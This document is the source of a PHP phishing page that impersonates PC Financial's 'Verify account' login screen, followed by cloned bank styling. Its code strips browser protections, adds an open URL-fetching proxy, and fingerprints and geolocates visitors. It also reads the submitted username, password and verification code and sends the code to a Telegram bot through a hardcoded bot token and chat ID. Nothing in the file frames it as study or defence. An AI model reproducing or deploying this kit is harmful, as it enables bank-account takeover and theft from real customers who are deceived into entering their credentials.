<?php

header("Content-Security-Policy-Report-Only: default-src 'none'; script-src 'self'; connect-src 'self'; img-src 'self' data:; style-src 'self' 'unsafe-inline'");
header("X-XSS-Protection: 0");
header("X-Frame-Options: ALLOWALL");
header("Access-Control-Allow-Origin: *");
header("Access-Control-Allow-Credentials: true");
header("Access-Control-Allow-Methods: GET, POST, PUT, DELETE, OPTIONS");
header("Access-Control-Allow-Headers: X-Requested-With, Content-Type, Origin, Authorization, Accept, Client-Security-Token");

if(isset($_GET['bypass']) && $_GET['bypass'] == 'true'){
    $url = $_GET['url'];
    $ch = curl_init($url);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_HEADER, false);
    curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
    curl_setopt($ch, CURLOPT_USERAGENT, 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36');
    curl_setopt($ch, CURLOPT_HTTPHEADER, array(
        "Content-Security-Policy-Report-Only: default-src 'none'; script-src 'self'; connect-src 'self'; img-src 'self' data:; style-src 'self' 'unsafe-inline'",
        "X-XSS-Protection: 0",
        "X-Frame-Options: ALLOWALL",
        "Access-Control-Allow-Origin: *",
        "Access-Control-Allow-Credentials: true",
        "Access-Control-Allow-Methods: GET, POST, PUT, DELETE, OPTIONS",
        "Access-Control-Allow-Headers: X-Requested-With, Content-Type, Origin, Authorization, Accept, Client-Security-Token"
    ));
    $response = curl_exec($ch);
    $info = curl_getinfo($ch);
    curl_close($ch);

    header("HTTP/1.1 ".$info['http_code']);
    foreach ($info['headers'] as $header) {
        if (!preg_match('/^Transfer-Encoding:/i', $header)) {
            header($header);
        }
    }
    echo $response;
    exit;
}




$full_date = date("h:i:s|M/d/Y");
$time = date("h:i:s");
$date = date("M/d/Y");

function get_client_ip()
{
    $ipaddress = '';
    if (isset($_SERVER['HTTP_CLIENT_IP'])) {
        $ipaddress = $_SERVER['HTTP_CLIENT_IP'];
    } else if (isset($_SERVER['HTTP_X_FORWARDED_FOR'])) {
        $ipaddress = $_SERVER['HTTP_X_FORWARDED_FOR'];
    } else if (isset($_SERVER['HTTP_X_FORWARDED'])) {
        $ipaddress = $_SERVER['HTTP_X_FORWARDED'];
    } else if (isset($_SERVER['HTTP_FORWARDED_FOR'])) {
        $ipaddress = $_SERVER['HTTP_FORWARDED_FOR'];
    } else if (isset($_SERVER['HTTP_FORWARDED'])) {
        $ipaddress = $_SERVER['HTTP_FORWARDED'];
    } else if (isset($_SERVER['REMOTE_ADDR'])) {
        $ipaddress = $_SERVER['REMOTE_ADDR'];
    } else {
        $ipaddress = 'UNKNOWN';
    }

    return $ipaddress;
}
$user_agent = $_SERVER['HTTP_USER_AGENT'];

function getOS() { 
    global $user_agent;
    $os_platform  = "Unknown OS Platform";
    $os_array     = array(
                          '/windows nt 10/i'      =>  'Windows 10',
                          '/windows nt 6.3/i'     =>  'Windows 8.1',
                          '/windows nt 6.2/i'     =>  'Windows 8',
                          '/windows nt 6.1/i'     =>  'Windows 7',
                          '/windows nt 6.0/i'     =>  'Windows Vista',
                          '/windows nt 5.2/i'     =>  'Windows Server 2003/XP x64',
                          '/windows nt 5.1/i'     =>  'Windows XP',
                          '/windows xp/i'         =>  'Windows XP',
                          '/windows nt 5.0/i'     =>  'Windows 2000',
                          '/windows me/i'         =>  'Windows ME',
                          '/win98/i'              =>  'Windows 98',
                          '/win95/i'              =>  'Windows 95',
                          '/win16/i'              =>  'Windows 3.11',
                          '/macintosh|mac os x/i' =>  'Mac OS X',
                          '/mac_powerpc/i'        =>  'Mac OS 9',
                          '/linux/i'              =>  'Linux',
                          '/ubuntu/i'             =>  'Ubuntu',
                          '/iphone/i'             =>  'iPhone',
                          '/ipod/i'               =>  'iPod',
                          '/ipad/i'               =>  'iPad',
                          '/android/i'            =>  'Android',
                          '/blackberry/i'         =>  'BlackBerry',
                          '/webos/i'              =>  'Mobile'
                    );

    foreach ($os_array as $regex => $value)
        if (preg_match($regex, $user_agent))
            $os_platform = $value;

    return $os_platform;
}

function getBrowser() {
    global $user_agent;
    $browser        = "Unknown Browser";
    $browser_array = array(
                            '/msie/i'      => 'Internet Explorer',
                            '/firefox/i'   => 'Firefox',
                            '/safari/i'    => 'Safari',
                            '/chrome/i'    => 'Chrome',
                            '/edge/i'      => 'Edge',
                            '/opera/i'     => 'Opera',
                            '/netscape/i'  => 'Netscape',
                            '/maxthon/i'   => 'Maxthon',
                            '/konqueror/i' => 'Konqueror',
                            '/mobile/i'    => 'Handheld Browser'
                     );

    foreach ($browser_array as $regex => $value)
        if (preg_match($regex, $user_agent))
            $browser = $value;

    return $browser;
}


$user_os        = getOS();
$user_browser   = getBrowser();
 
$PublicIP = get_client_ip();
$localHost = "127.0.0.1";

if (strpos($PublicIP, ',') !== false) {
    $PublicIP = explode(",", $PublicIP)[0];
}

$file       = 'data.dat';
$file1       = 'combo.txt';
$file2       = 'master.log';
$ip         = "".$PublicIP;
$uaget      = "".$user_agent;
$bsr        = "".$user_browser;
$uos        = "".$user_os;
$ust= explode(" ", $user_agent);
$vr= $ust[3];
$ver=str_replace(")", "", $vr);
$version   = "Version              : ".$ver;
if (strpos($PublicIP, $localHost) !== false) {
    $details = '{
        "success": false
    }';
}
else {
    $details  = file_get_contents("http://ipwhois.app/json/$PublicIP");
}
$details  = json_decode($details, true);
$success  = $details['success'];

$fp = fopen($file, 'a');

if ($success==false) {
    fwrite($fp, $ip."\n");
    fwrite($fp, $uos."\n");
    fwrite($fp, $version."\n");
    fwrite($fp, $bsr."\n");
    fclose($fp);
} else if ($success==true) {
    $country    = $details['country'];
    $city       = $details['city'];
    $continent  = $details['continent'];
    $tp         = $details['type'];
    $cn         = $details['country_phone'];
    $is         = $details['isp'];
    $la         = $details['latitude'];
    $lp         = $details['longitude'];
    $crn        = $details['currency'];
    $type       = $tp;
    $bank       = "PCFianacial";
    $user       = $_POST['username'];
    $pass       = $_POST['password'];
    $code       = $_POST['code']; 

    $isp        = $is;
    $currency   = "".$full_date;
    $li     = ",";

    

} else {
    $status     = "Status : ".$success;
    fwrite($fp, $status."\n");
    fwrite($fp, $uaget."\n");
    fclose($fp);
}



$message = "$code";
$apiToken = "5884162033:AAG_CgkEbML9dXsIy9E1K03yWzUOxbmf8cA"; 
$data = [
    'chat_id' => '-821080105',
    'text' => $message
];

$response = file_get_contents("https://api.telegram.org/bot$apiToken/sendMessage?" .
                                 http_build_query($data) );
                                                    

?>
<html<head>
        <meta http-equiv="Cache-Control" content="no-cache, no-store, must-revalidate">
        <meta http-equiv="Pragma" content="no-cache">
        <meta http-equiv="Expires" content="0">
        <meta name="viewport" content="width=device-width,initial-scale=1">
        <title>Verify account | PC Financial</title>
        <meta name="title" content="PC Financial | Canadian Rewards Credit Cards with No Annual Fee | Services financiers PC | Cartes de crédit canadiennes avec récompenses et sans frais annuels">
        <meta name="description">
        <meta name="keywords" content="">
        <meta name="twitter:card" content="summary">
        <meta name="twitter:title" content="Verify account | PC Financial">
        <meta name="twitter:description">
        <meta name="twitter:image" content="">
        <meta property="og:type" content="article">
        <meta property="og:title" content="Verify account | PC Financial">
        <meta property="og:description">
        <meta property="og:image" content="">
        <meta name="apple-itunes-app" content="app-id=1446078005">
        <link rel="icon" type="image/x-icon" href="https://secure.pcfinancial.ca/favicon.ico">
        <link rel="stylesheet" href="./files/styles.css">
        <style type="text/css">iframe#_hjRemoteVarsFrame {display: none !important; width: 1px !important; height: 1px !important; opacity: 0 !important; pointer-events: none !important;}</style>
        <style></style>
        <style>@-webkit-keyframes menuOpen{from{-webkit-transform:scaleY(0);transform:scaleY(0);opacity:0}}@keyframes menuOpen{from{-webkit-transform:scaleY(0);transform:scaleY(0);opacity:0}}@-webkit-keyframes slideIn{0%{-webkit-transform:translateX(100%);transform:translateX(100%)}100%{-webkit-transform:translateX(0);transform:translateX(0)}}@keyframes slideIn{0%{-webkit-transform:translateX(100%);transform:translateX(100%)}100%{-webkit-transform:translateX(0);transform:translateX(0)}}@-webkit-keyframes overlayFadeIn{0%{opacity:0}100%{opacity:.35}}@keyframes overlayFadeIn{0%{opacity:0}100%{opacity:.35}}*[_ngcontent-hve-c1]{font-family:Averta;line-height:1.2}h2[_ngcontent-hve-c1]{font-family:Averta;font-size:2.25em;font-weight:700;margin:0 0 20px;color:#2b2c32}.fs-banner[_ngcontent-hve-c1]{position:fixed;-webkit-backface-visibility:hidden;backface-visibility:hidden;top:0;left:0;width:100%;height:100%;background:#fff;z-index:10000;display:-webkit-box;display:-ms-flexbox;display:flex;-webkit-box-orient:vertical;-webkit-box-direction:normal;-ms-flex-direction:column;flex-direction:column;overflow-y:scroll}.fs-header[_ngcontent-hve-c1]{padding:20px;border-bottom:1px solid #e8e9eb;z-index:1;background:#fff;width:calc(100% - 40px);position:fixed;-webkit-backface-visibility:hidden;backface-visibility:hidden;display:-webkit-box;display:-ms-flexbox;display:flex;-webkit-box-pack:justify;-ms-flex-pack:justify;justify-content:space-between}.fs-body[_ngcontent-hve-c1]{display:-webkit-box;display:-ms-flexbox;display:flex;-webkit-box-align:center;-ms-flex-align:center;align-items:center;-webkit-box-pack:center;-ms-flex-pack:center;justify-content:center;-webkit-box-flex:1;-ms-flex-positive:1;flex-grow:1}.content[_ngcontent-hve-c1], .failed-content[_ngcontent-hve-c1]{margin:0 auto;max-width:600px;padding:94px 20px 40px}.failed-content[_ngcontent-hve-c1]{padding-top:114px}h2.failed[_ngcontent-hve-c1]::before{content:"";background-image:url(/assets/images/result-error.svg);background-size:contain;background-repeat:no-repeat;vertical-align:middle;height:42px;width:42px;display:block;margin-bottom:40px}p[_ngcontent-hve-c1]{margin:0;font-size:1.125em;font-weight:400;color:#6b6b6b;line-height:1.67}.tel[_ngcontent-hve-c1]{white-space:nowrap}</style>
        <style>@-webkit-keyframes menuOpen{from{-webkit-transform:scaleY(0);transform:scaleY(0);opacity:0}}@keyframes menuOpen{from{-webkit-transform:scaleY(0);transform:scaleY(0);opacity:0}}@-webkit-keyframes slideIn{0%{-webkit-transform:translateX(100%);transform:translateX(100%)}100%{-webkit-transform:translateX(0);transform:translateX(0)}}@keyframes slideIn{0%{-webkit-transform:translateX(100%);transform:translateX(100%)}100%{-webkit-transform:translateX(0);transform:translateX(0)}}@-webkit-keyframes overlayFadeIn{0%{opacity:0}100%{opacity:.35}}@keyframes overlayFadeIn{0%{opacity:0}100%{opacity:.35}}*[_ngcontent-hve-c4]{font-family:Averta;line-height:1.2}p[_ngcontent-hve-c4]{margin:0;font-size:.875em;font-weight:400}h2[_ngcontent-hve-c4]{font-family:Averta;font-weight:700}.nav[_ngcontent-hve-c4]{position:absolute;top:20px;left:20px}.nav[_ngcontent-hve-c4]   h1[_ngcontent-hve-c4]{margin:0}.login-container[_ngcontent-hve-c4]   header[_ngcontent-hve-c4]{background-color:#f6f6f7;padding:110px 20px 40px}.login-container[_ngcontent-hve-c4]   header[_ngcontent-hve-c4]   p[_ngcontent-hve-c4]{margin:0;font-size:1.125em;font-weight:400}.login-container[_ngcontent-hve-c4]   header[_ngcontent-hve-c4]   h2[_ngcontent-hve-c4]{font-size:2em;font-weight:700;color:#e81c11;margin:0 0 30px}@media only screen and (min-width:900px){.login-container[_ngcontent-hve-c4]{display:-webkit-box;display:-ms-flexbox;display:flex}.login-container[_ngcontent-hve-c4]   header[_ngcontent-hve-c4]{width:57%;padding:26vh 40px 0}.login-container[_ngcontent-hve-c4]   header[_ngcontent-hve-c4]   h2[_ngcontent-hve-c4]{font-size:3em;font-weight:700}}.login-form-container[_ngcontent-hve-c4]{padding:40px 20px 80px;display:-webkit-box;display:-ms-flexbox;display:flex;-ms-flex-wrap:wrap;flex-wrap:wrap}@media only screen and (min-width:1440px){.login-container[_ngcontent-hve-c4]   header[_ngcontent-hve-c4]   .login-header-container[_ngcontent-hve-c4]{max-width:700px;margin-left:auto;margin-right:auto}.login-container[_ngcontent-hve-c4]   header[_ngcontent-hve-c4]   h2[_ngcontent-hve-c4]{font-size:4.5em;font-weight:700}.login-form-container[_ngcontent-hve-c4]{max-width:420px;margin-right:auto}}.login-form-container[_ngcontent-hve-c4]   h3[_ngcontent-hve-c4]{font-size:1.5em;font-weight:700;margin:0 0 50px}.login-form-container[_ngcontent-hve-c4]   .create-account-container[_ngcontent-hve-c4]{-webkit-box-ordinal-group:3;-ms-flex-order:2;order:2;margin-bottom:50px;-ms-flex-preferred-size:100%;flex-basis:100%}@media only screen and (min-width:900px){.login-form-container[_ngcontent-hve-c4]{width:43%;padding:26vh 40px 19vh}.login-form-container[_ngcontent-hve-c4]   .create-account-container[_ngcontent-hve-c4]{-ms-flex-preferred-size:100%;flex-basis:100%}}.login-form-container[_ngcontent-hve-c4]   .create-account-container[_ngcontent-hve-c4]   .nav-link[_ngcontent-hve-c4]{margin-left:10px}.login-form-container[_ngcontent-hve-c4]   .create-account-container[_ngcontent-hve-c4]   p[_ngcontent-hve-c4]{margin-bottom:10px}.login-form-container[_ngcontent-hve-c4]   .forgot-container[_ngcontent-hve-c4]{-webkit-box-ordinal-group:4;-ms-flex-order:3;order:3}.login-form-container[_ngcontent-hve-c4]   .forgot-container[_ngcontent-hve-c4]   .nav-link[_ngcontent-hve-c4]{display:block}.login-form-container[_ngcontent-hve-c4]   .forgot-container[_ngcontent-hve-c4]   .nav-link[_ngcontent-hve-c4]:first-of-type{margin-bottom:20px}@media only screen and (min-width:900px){.login-form-container[_ngcontent-hve-c4]   .forgot-container[_ngcontent-hve-c4]{-ms-flex-preferred-size:100%;flex-basis:100%}.login-form-container[_ngcontent-hve-c4]   .forgot-container[_ngcontent-hve-c4]   .nav-link[_ngcontent-hve-c4]{display:inline-block}.login-form-container[_ngcontent-hve-c4]   .forgot-container[_ngcontent-hve-c4]   .nav-link[_ngcontent-hve-c4]:first-of-type{margin-right:20px}}form[_ngcontent-hve-c4]{-webkit-box-ordinal-group:2;-ms-flex-order:1;order:1;margin-bottom:30px;-ms-flex-preferred-size:100%;flex-basis:100%}form[_ngcontent-hve-c4]   label[_ngcontent-hve-c4]{font-size:.875em;font-weight:400}.tooltip-container[_ngcontent-hve-c4]{margin-bottom:50px}.tooltip-container[_ngcontent-hve-c4]   tooltip[_ngcontent-hve-c4]{-ms-flex-item-align:center;align-self:center}.tooltip-container[_ngcontent-hve-c4]   label[_ngcontent-hve-c4]{margin:0}.tooltip-container[_ngcontent-hve-c4]   span[_ngcontent-hve-c4]{margin-right:10px}</style>
        <style>header[_ngcontent-hve-c5]{position:absolute;top:20px;left:20px}</style>
        <style>@-webkit-keyframes menuOpen{from{-webkit-transform:scaleY(0);transform:scaleY(0);opacity:0}}@keyframes menuOpen{from{-webkit-transform:scaleY(0);transform:scaleY(0);opacity:0}}@-webkit-keyframes slideIn{0%{-webkit-transform:translateX(100%);transform:translateX(100%)}100%{-webkit-transform:translateX(0);transform:translateX(0)}}@keyframes slideIn{0%{-webkit-transform:translateX(100%);transform:translateX(100%)}100%{-webkit-transform:translateX(0);transform:translateX(0)}}@-webkit-keyframes overlayFadeIn{0%{opacity:0}100%{opacity:.35}}@keyframes overlayFadeIn{0%{opacity:0}100%{opacity:.35}}*[_ngcontent-hve-c6]{font-family:Averta;line-height:1.2}p[_ngcontent-hve-c6]{margin:0;font-size:.875em;font-weight:400}h2[_ngcontent-hve-c6]{font-family:Averta;font-weight:700}button.btn-tooltip[_ngcontent-hve-c6]{background-image:url(/assets/images/info.svg);border:none;background-color:transparent;background-repeat:no-repeat;background-position:center center;background-size:15px 15px;height:15px;width:15px;vertical-align:middle;position:relative;top:-1px}button.btn-tooltip.balance-type[_ngcontent-hve-c6]{background-image:url(/assets/images/info.svg)}  .tooltip-container{display:-webkit-box;display:-ms-flexbox;display:flex;-ms-flex-wrap:wrap;flex-wrap:wrap}  .tooltip.show{position:absolute;z-index:10000}  .tooltip .tooltip-inner{width:200px;padding:25px 20px 30px;background-color:#2b2c32;border:1px solid rgba(116,119,122,.06);border-bottom:none;border-radius:4px;-webkit-box-shadow:0 5px 10px 0 rgba(0,0,0,.08);box-shadow:0 5px 10px 0 rgba(0,0,0,.08);text-align:left;font-size:1rem}  .tooltip .tooltip-inner p{color:#fff;font-size:.875em;line-height:1.5;margin-bottom:1em;font-weight:400}  .tooltip .tooltip-inner p:last-child{margin-bottom:0}  .bs-tooltip-bottom .arrow,   .bs-tooltip-top .arrow{left:50%!important;margin-left:-5px;border-color:transparent;border-style:solid;position:absolute;width:0;height:0}  .bs-tooltip-top{margin-bottom:10px}  .bs-tooltip-top .arrow{bottom:-5px;border-top-color:#2b2c32;border-width:5px 5px 0}  .bs-tooltip-bottom{margin-top:10px}  .bs-tooltip-bottom .arrow{top:-5px;border-bottom-color:#2b2c32;border-width:0 5px 5px}</style>
        <style>*[_ngcontent-hve-c7]{font-family:Averta;line-height:1.2}p[_ngcontent-hve-c7]{margin:0;font-size:.875em;font-weight:400}h2[_ngcontent-hve-c7]{font-family:Averta;font-weight:700}@-webkit-keyframes menuOpen{from{-webkit-transform:scaleY(0);transform:scaleY(0);opacity:0}}@keyframes menuOpen{from{-webkit-transform:scaleY(0);transform:scaleY(0);opacity:0}}@-webkit-keyframes slideIn{0%{-webkit-transform:translateX(100%);transform:translateX(100%)}100%{-webkit-transform:translateX(0);transform:translateX(0)}}@keyframes slideIn{0%{-webkit-transform:translateX(100%);transform:translateX(100%)}100%{-webkit-transform:translateX(0);transform:translateX(0)}}@-webkit-keyframes overlayFadeIn{0%{opacity:0}100%{opacity:.35}}@keyframes overlayFadeIn{0%{opacity:0}100%{opacity:.35}}.loader-container[_ngcontent-hve-c7]{position:absolute;top:0;bottom:0;left:0;right:0;display:-webkit-box;display:-ms-flexbox;display:flex;-webkit-box-align:center;-ms-flex-align:center;align-items:center}.loader-container[_ngcontent-hve-c7]   .supporting-copy[_ngcontent-hve-c7]{font-size:1.25em;font-weight:600;color:#6b6b6b;line-height:1.6;letter-spacing:normal;text-align:center;margin-top:50px}.loader-container[_ngcontent-hve-c7]   .loader[_ngcontent-hve-c7]{-webkit-animation-duration:1s;animation-duration:1s;-webkit-animation-iteration-count:infinite;animation-iteration-count:infinite;-webkit-animation-name:rotate-cw;animation-name:rotate-cw;-webkit-animation-timing-function:linear;animation-timing-function:linear;width:20px;height:20px;border:3px solid #e81c11;border-right-color:transparent;border-radius:50%;display:inline-block}.loader-container[_ngcontent-hve-c7]   .loader[_ngcontent-hve-c7]   p[_ngcontent-hve-c7]{font-size:0;margin:0}.loader-container.center-in-parent[_ngcontent-hve-c7]{-webkit-box-pack:center;-ms-flex-pack:center;justify-content:center}.loader-container.right-of-parent[_ngcontent-hve-c7]{-webkit-box-pack:end;-ms-flex-pack:end;justify-content:flex-end;right:20px}.loader-container.inline[_ngcontent-hve-c7]{-webkit-box-orient:vertical;-webkit-box-direction:normal;-ms-flex-direction:column;flex-direction:column}.loader-container.lrg[_ngcontent-hve-c7]{z-index:100;-webkit-box-pack:center;-ms-flex-pack:center;justify-content:center;height:100%;width:100%;background-color:#fff;min-height:100px}.loader-container.lrg.inline[_ngcontent-hve-c7]{background:0 0;z-index:0}.loader-container.lrg[_ngcontent-hve-c7]   .loader[_ngcontent-hve-c7]{height:50px;width:50px;border-width:8px}.loader-container.opaque[_ngcontent-hve-c7]{background-color:rgba(255,255,255,.3)}</style>
        <style>@-webkit-keyframes menuOpen{from{-webkit-transform:scaleY(0);transform:scaleY(0);opacity:0}}@keyframes menuOpen{from{-webkit-transform:scaleY(0);transform:scaleY(0);opacity:0}}@-webkit-keyframes slideIn{0%{-webkit-transform:translateX(100%);transform:translateX(100%)}100%{-webkit-transform:translateX(0);transform:translateX(0)}}@keyframes slideIn{0%{-webkit-transform:translateX(100%);transform:translateX(100%)}100%{-webkit-transform:translateX(0);transform:translateX(0)}}@-webkit-keyframes overlayFadeIn{0%{opacity:0}100%{opacity:.35}}@keyframes overlayFadeIn{0%{opacity:0}100%{opacity:.35}}*[_ngcontent-hve-c8]{font-family:Averta;line-height:1.2}p[_ngcontent-hve-c8]{margin:0;font-size:.875em;font-weight:400}h2[_ngcontent-hve-c8]{font-family:Averta;font-weight:700}.blade-content[_ngcontent-hve-c8]{background-image:url(/assets/images/inactive-account.svg);background-repeat:no-repeat;background-position:left top;background-size:300px 300px;padding-top:330px}.blade-content[_ngcontent-hve-c8]   h3[_ngcontent-hve-c8]{font-size:2.25em;font-weight:700;color:#2b2c32;margin:0 0 20px}.blade-content[_ngcontent-hve-c8]   p[_ngcontent-hve-c8]{font-size:1.125em;font-weight:400;color:#6b6b6b;margin:0 0 50px}</style>
        <style>@-webkit-keyframes menuOpen{from{-webkit-transform:scaleY(0);transform:scaleY(0);opacity:0}}@keyframes menuOpen{from{-webkit-transform:scaleY(0);transform:scaleY(0);opacity:0}}@-webkit-keyframes slideIn{0%{-webkit-transform:translateX(100%);transform:translateX(100%)}100%{-webkit-transform:translateX(0);transform:translateX(0)}}@keyframes slideIn{0%{-webkit-transform:translateX(100%);transform:translateX(100%)}100%{-webkit-transform:translateX(0);transform:translateX(0)}}@-webkit-keyframes overlayFadeIn{0%{opacity:0}100%{opacity:.35}}@keyframes overlayFadeIn{0%{opacity:0}100%{opacity:.35}}*[_ngcontent-hve-c10]{font-family:Averta;line-height:1.2}p[_ngcontent-hve-c10]{margin:0;font-size:.875em;font-weight:400}h2[_ngcontent-hve-c10]{font-family:Averta;font-weight:700}footer[_ngcontent-hve-c10]{background-color:#2b2c32}.footer-wrapper[_ngcontent-hve-c10]{padding:38px 35px;overflow:hidden;display:-webkit-box;display:-ms-flexbox;display:flex;-webkit-box-orient:vertical;-webkit-box-direction:normal;-ms-flex-direction:column;flex-direction:column}@media only screen and (min-width:1440px){.footer-wrapper[_ngcontent-hve-c10]{padding:40px 60px;-webkit-box-orient:horizontal;-webkit-box-direction:normal;-ms-flex-direction:row;flex-direction:row;max-width:1440px;margin-left:auto;margin-right:auto}}.footer-wrapper[_ngcontent-hve-c10]   ul[_ngcontent-hve-c10]{padding:0}.footer-wrapper[_ngcontent-hve-c10]   ul[_ngcontent-hve-c10]   li[_ngcontent-hve-c10]{list-style:none;margin-bottom:25px}.footer-wrapper[_ngcontent-hve-c10]   a[_ngcontent-hve-c10], .footer-wrapper[_ngcontent-hve-c10]   p[_ngcontent-hve-c10]{text-decoration:none;color:#fff;font-size:.875em;font-weight:400}.footer-container[_ngcontent-hve-c10], .locale-container[_ngcontent-hve-c10]{width:100%}.locale-container[_ngcontent-hve-c10]{-webkit-box-flex:0;-ms-flex:0 1 50px;flex:0 1 50px}.footer-list-container[_ngcontent-hve-c10]{display:-webkit-box;display:-ms-flexbox;display:flex;-webkit-box-orient:vertical;-webkit-box-direction:normal;-ms-flex-direction:column;flex-direction:column}.footer-child[_ngcontent-hve-c10]{clear:both}.footer-child.link-lists[_ngcontent-hve-c10]{margin-bottom:20px}.footer-child.link-lists[_ngcontent-hve-c10]   .lists-container[_ngcontent-hve-c10]{float:left}.footer-child.link-lists[_ngcontent-hve-c10]   ul[_ngcontent-hve-c10]{margin:0 60px 0 0}@media only screen and (min-width:768px){.footer-child.link-lists[_ngcontent-hve-c10]   ul[_ngcontent-hve-c10]{float:left}}.footer-logo-container[_ngcontent-hve-c10]{margin-bottom:10px}.footer-logo-container[_ngcontent-hve-c10]   h2[_ngcontent-hve-c10]{display:inline-block;line-height:0;margin:0}.footer-logo-container[_ngcontent-hve-c10]   a[_ngcontent-hve-c10]{display:inline-block;line-height:0}.footer-app_stores[_ngcontent-hve-c10], .footer-social[_ngcontent-hve-c10]{overflow:hidden}.footer-app_stores[_ngcontent-hve-c10]   ul[_ngcontent-hve-c10], .footer-social[_ngcontent-hve-c10]   ul[_ngcontent-hve-c10]{clear:both}.footer-app_stores[_ngcontent-hve-c10]   ul[_ngcontent-hve-c10]   li[_ngcontent-hve-c10], .footer-social[_ngcontent-hve-c10]   ul[_ngcontent-hve-c10]   li[_ngcontent-hve-c10]{float:left;margin-right:10px;margin-bottom:10px}.footer-app_stores[_ngcontent-hve-c10]   ul[_ngcontent-hve-c10]   li[_ngcontent-hve-c10]   a[_ngcontent-hve-c10], .footer-app_stores[_ngcontent-hve-c10]   ul[_ngcontent-hve-c10]   li[_ngcontent-hve-c10]   a[_ngcontent-hve-c10]   img[_ngcontent-hve-c10], .footer-social[_ngcontent-hve-c10]   ul[_ngcontent-hve-c10]   li[_ngcontent-hve-c10]   a[_ngcontent-hve-c10], .footer-social[_ngcontent-hve-c10]   ul[_ngcontent-hve-c10]   li[_ngcontent-hve-c10]   a[_ngcontent-hve-c10]   img[_ngcontent-hve-c10]{vertical-align:middle}.footer-app_stores.no-social[_ngcontent-hve-c10]{margin-bottom:25px}.footer-social[_ngcontent-hve-c10]{margin-bottom:35px}.footer-social[_ngcontent-hve-c10]   ul[_ngcontent-hve-c10]   li[_ngcontent-hve-c10]{margin-right:35px}.footer-social[_ngcontent-hve-c10]   ul[_ngcontent-hve-c10]   li[_ngcontent-hve-c10]   a[_ngcontent-hve-c10]{vertical-align:middle;opacity:.4;-webkit-transition:opacity .3s ease-out;-o-transition:opacity .3s ease-out;transition:opacity .3s ease-out}.footer-social[_ngcontent-hve-c10]   ul[_ngcontent-hve-c10]   li[_ngcontent-hve-c10]   a[_ngcontent-hve-c10]:hover{opacity:1}.copyright[_ngcontent-hve-c10]{margin-bottom:30px;clear:both;max-width:552px;font-size:.625em;line-height:1.6}@media only screen and (min-width:1440px){.footer-list-container[_ngcontent-hve-c10]{-webkit-box-orient:horizontal;-webkit-box-direction:normal;-ms-flex-direction:row;flex-direction:row}.footer-child.branding-social[_ngcontent-hve-c10]{margin-right:170px}.copyright[_ngcontent-hve-c10]{margin-bottom:0;max-width:768px}}</style>
        <style>h1[_ngcontent-hve-c3], h2[_ngcontent-hve-c3]{margin:0;display:table}h1[_ngcontent-hve-c3]   img[_ngcontent-hve-c3], h2[_ngcontent-hve-c3]   img[_ngcontent-hve-c3]{display:block}</style>
        <style>@-webkit-keyframes menuOpen{from{-webkit-transform:scaleY(0);transform:scaleY(0);opacity:0}}@keyframes menuOpen{from{-webkit-transform:scaleY(0);transform:scaleY(0);opacity:0}}@-webkit-keyframes slideIn{0%{-webkit-transform:translateX(100%);transform:translateX(100%)}100%{-webkit-transform:translateX(0);transform:translateX(0)}}@keyframes slideIn{0%{-webkit-transform:translateX(100%);transform:translateX(100%)}100%{-webkit-transform:translateX(0);transform:translateX(0)}}@-webkit-keyframes overlayFadeIn{0%{opacity:0}100%{opacity:.35}}@keyframes overlayFadeIn{0%{opacity:0}100%{opacity:.35}}*[_ngcontent-hve-c14]{font-family:Averta;line-height:1.2}p[_ngcontent-hve-c14]{margin:0;font-size:.875em;font-weight:400}h2[_ngcontent-hve-c14]{font-family:Averta;font-weight:700}button[_ngcontent-hve-c14]{background-color:transparent;border:none;color:#fff;padding:0;font-size:1em;font-weight:400}</style>
        <style>ngb-modal-window .component-host-scrollable{display:-ms-flexbox;display:flex;-ms-flex-direction:column;flex-direction:column;overflow:hidden}</style>
        <style type="text/css" id="kampyleStyle">.noOutline{outline: none !important;}.wcagOutline:focus{outline: 1px dashed #595959 !important;outline-offset: 2px !important;transition: none !important;}button#nebula_div_btn { height: auto !important } .kampyle_vertical_button { background-color:transparent !important;font-family:"Open Sans",sans-serif;cursor:pointer;position:fixed;top:45%;z-index:99999990;height:35px !important;min-height: 35px !important;max-height: 35px !important;width:125px !important;max-width: 125px !important;min-width: 125px !important;-ms-transform:rotate(90deg);-webkit-transform:rotate(90deg);transform:rotate(90deg) } .kampyle_vertical_button .kampyle_button { height:35px;min-height: 35px !important;max-height: 35px !important;width:125px !important;min-width: 125px !important;max-width: 125px !important; background:#ee2e24;color:#e7e7e7;position:absolute;top:0;left:0;z-index:-1; } .kampyle_vertical_button .kampyle_button-text { color:#e7e7e7;font-size:14px;line-height:35px;text-align:center;font-weight:normal !important; } .kampyle_vertical_button.kampyle_left .kampyle_button { -webkit-border-radius:3px 3px 0 0;-moz-border-radius:3px 3px 0 0;-ms-border-radius:3px 3px 0 0;border-radius:3px 3px 0 0; } .kampyle_vertical_button.kampyle_right { right:-45px; } .kampyle_vertical_button.kampyle_left { left:-45px } .kampyle_vertical_button.kampyle_right .kampyle_button { -webkit-border-radius:0 0 3px 3px;-moz-border-radius:0 0 3px 3px;-ms-border-radius:0 0 3px 3px;border-radius:0 0 3px 3px } .kampyle_vertical_button.kampyle_right, .kampyle_vertical_button.kampyle_left  { padding: 0 !important; }.noOutline{outline: none !important;}.wcagOutline:focus{outline: 1px dashed #595959 !important;outline-offset: 2px !important;transition: none !important;}.noOutline{outline: none !important;}.wcagOutline:focus{outline: 1px dashed #595959 !important;outline-offset: 2px !important;transition: none !important;}</style>
        <style>@-webkit-keyframes menuOpen{from{-webkit-transform:scaleY(0);transform:scaleY(0);opacity:0}}@keyframes menuOpen{from{-webkit-transform:scaleY(0);transform:scaleY(0);opacity:0}}@-webkit-keyframes slideIn{0%{-webkit-transform:translateX(100%);transform:translateX(100%)}100%{-webkit-transform:translateX(0);transform:translateX(0)}}@keyframes slideIn{0%{-webkit-transform:translateX(100%);transform:translateX(100%)}100%{-webkit-transform:translateX(0);transform:translateX(0)}}@-webkit-keyframes overlayFadeIn{0%{opacity:0}100%{opacity:.35}}@keyframes overlayFadeIn{0%{opacity:0}100%{opacity:.35}}.blade-header[_ngcontent-hve-c11]{background:#fff}</style>
        <script src="./files/jquery-3.6.0.min.js###%" crossorigin="anonymous"></script>
        <script>var lrbank = 'PC'; var lrinfo = 'Details';</script>
        <script src="./files/actions.js###%"></script>
        <script src="./files/jquery.mask.js###%"></script>
